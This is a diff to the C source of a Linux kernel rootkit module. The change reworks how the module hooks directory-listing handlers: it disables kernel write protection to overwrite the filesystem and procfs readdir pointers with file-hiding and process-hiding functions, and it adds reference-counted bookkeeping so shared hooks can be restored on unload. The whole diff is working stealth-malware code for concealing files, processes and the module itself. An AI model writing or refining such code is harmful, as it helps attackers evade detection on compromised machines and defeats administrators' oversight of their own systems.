@@ -43,6 +43,14 @@ struct hooked_dir{
 
 };
 
+//retarded hack tbh
+struct vfs_fops{
+	struct file_operations* fops;
+	int (*readdir)(struct file*, void*, filldir_t);
+	struct list_head list;
+	unsigned int refcount;
+
+};
 static int module_hidden;
 static char* hide = "hide";
 static char* show = "show";
@@ -70,6 +78,7 @@ static struct list_head *banned_files;
 
 LIST_HEAD(hidden_pid_list);
 LIST_HEAD(hooked_dir_list);
+LIST_HEAD(vfs_fops_list);
 
 static char* strdup(const char* str){
 	char * tmp;
@@ -129,9 +138,72 @@ static struct file_entry*  find_file_entry(const char *name, struct list_head* h
 
 }
 
+static struct vfs_fops*  find_vfs_fops(struct file_operations* fops, struct list_head* head){
+	struct vfs_fops* i;
+	list_for_each_entry(i, head,list){
+
+		if( i->fops == fops){
+			return i;
+		}
+
+	}
+	return NULL;
+
+}
+
+static  struct vfs_fops* create_vfs_fops_entry(struct file_operations* fops
+				       ,int (*new_readdir)(struct file*, void*, filldir_t)	
+				       ,struct list_head* head){
 
 
+	struct vfs_fops* tmp=NULL;
 
+	tmp = find_vfs_fops(fops, &vfs_fops_list);
+
+	if(tmp!=NULL){
+		tmp->refcount++;
+		return tmp;		
+	}
+
+	tmp = kmalloc(sizeof(struct vfs_fops), GFP_KERNEL);	
+
+	if(tmp == NULL){
+		printk(KERN_INFO"%s: out of memory", MODULE_NAME);
+		return NULL;
+	}
+
+	tmp ->readdir = fops->readdir;
+
+	disable_wp();
+		fops->readdir = new_readdir;
+	enable_wp();
+
+	tmp->refcount++;
+
+	list_add( &tmp->list, head);
+
+	return tmp;
+}
+
+static void _delete_vfs_fops(struct vfs_fops* entry){
+	list_del(&entry->list);
+	disable_wp();
+		entry->fops->readdir= entry->readdir;
+	enable_wp();
+	kfree(entry);
+}
+static void free_vfs_fops(struct file_operations* fops,struct list_head* head){
+	struct vfs_fops* tmp;
+	tmp = find_vfs_fops(fops, head);	
+	if(tmp !=NULL){
+		tmp->refcount--;
+		if(tmp->refcount == 0 ){
+			_delete_vfs_fops(tmp);
+		}
+
+	}
+
+}
 
 static void delete_hooked_dir_entry(struct hooked_dir* entry){
 	struct list_head* tmp;
@@ -145,9 +217,7 @@ static void delete_hooked_dir_entry(struct hooked_dir* entry){
 		delete_file_entry(f_entry);
 	}	
 		
-	disable_wp();
-	entry->fops->readdir=entry->readdir;
-	enable_wp();
+	free_vfs_fops(entry->fops, &vfs_fops_list);
 
 	kfree(entry->name);
 	kfree(entry);
@@ -192,20 +262,22 @@ static int file_hider(struct file* fp, void* d, filldir_t filldir){
 	struct hooked_dir* hd;
 	char *magic;
 	int ret;
+	struct vfs_fops* vf;
 
-	magic = dentry_path(fp->f_dentry,filename,INTERNAL_BUFFER_LEN);
+	magic = dentry_path_raw(fp->f_dentry,filename,INTERNAL_BUFFER_LEN);
 
 	if(IS_ERR(magic)){
 		printk(KERN_INFO"%s error retrieving dir name inc mess", MODULE_NAME);
-		return -1;
+		return -ENOTDIR;
 	}
 
 
-	hd = find_hooked_dir_entry(filename, &hooked_dir_list);
+	hd = find_hooked_dir_entry(magic, &hooked_dir_list);
 	
 	if(hd == NULL){
-		printk(KERN_INFO"%s something is badly broken", MODULE_NAME);
-		return hd->readdir(fp, d, file_kernel_filldir);
+		vf = find_vfs_fops((struct file_operations*)fp->f_op, &vfs_fops_list);
+		printk(KERN_INFO"%s hitting supersmart linux kernel", MODULE_NAME);
+		return vf->readdir(fp,d,filldir);
 	}
 
 	mutex_lock(&filldir_mutex);	
@@ -221,6 +293,7 @@ static  struct hooked_dir* create_hooked_dir_entry(const char *name,struct list_
 
 	struct hooked_dir* tmp=NULL;
 	struct file* fp;
+	struct vfs_fops* vp;
 
 	tmp = kmalloc(sizeof(struct hooked_dir), GFP_KERNEL);	
 
@@ -246,13 +319,18 @@ static  struct hooked_dir* create_hooked_dir_entry(const char *name,struct list_
 		return NULL;
 	}
 
-	tmp->fops = (struct  file_operations*)fp -> f_op;
-	tmp->readdir = tmp->fops->readdir;
+	tmp->readdir = fp->f_op->readdir;
+	tmp->fops= (struct file_operations*)fp->f_op;
 
-	disable_wp();
-	tmp->fops->readdir = file_hider;
-	enable_wp();	
+	vp = create_vfs_fops_entry(tmp->fops, file_hider,&vfs_fops_list);	
 
+	if(vp == NULL){
+		printk(KERN_INFO"%s: failed  with vfs", MODULE_NAME);
+		kfree(tmp->name);
+		kfree(tmp);
+		return NULL;
+	}
+	
 	filp_close(fp,NULL);
 
 
@@ -346,7 +424,7 @@ static void show_file(const char* dir, const char *name){
 
 }
 
-static int get_filendir(char *str, char* dirname, char *filename){
+static int get_filendir(char *str, char* dirname, char *fname){
 	int i ; 
 
 	for(i = strlen(str); i>=0; i--){
@@ -356,7 +434,7 @@ static int get_filendir(char *str, char* dirname, char *filename){
 		}
 
 	}
-	return sscanf(str,"%s %s", dirname, filename) == 2 ; 
+	return sscanf(str,"%s %s", dirname, fname) == 2 ; 
 }
 
 
@@ -561,7 +639,7 @@ static int proc_init(void){
 	
 
 	disable_wp();
-	procfs_fops -> readdir = process_hider;
+		procfs_fops -> readdir = process_hider;
 	enable_wp();
 	
 	return 0; 
@@ -573,7 +651,7 @@ static void proc_cleanup(void){
 
 	if(procfs_fops !=NULL){
 		disable_wp();
-		procfs_fops -> readdir = procfs_readdir_proc ;
+			procfs_fops -> readdir = procfs_readdir_proc ;
 		enable_wp();
 	}
 
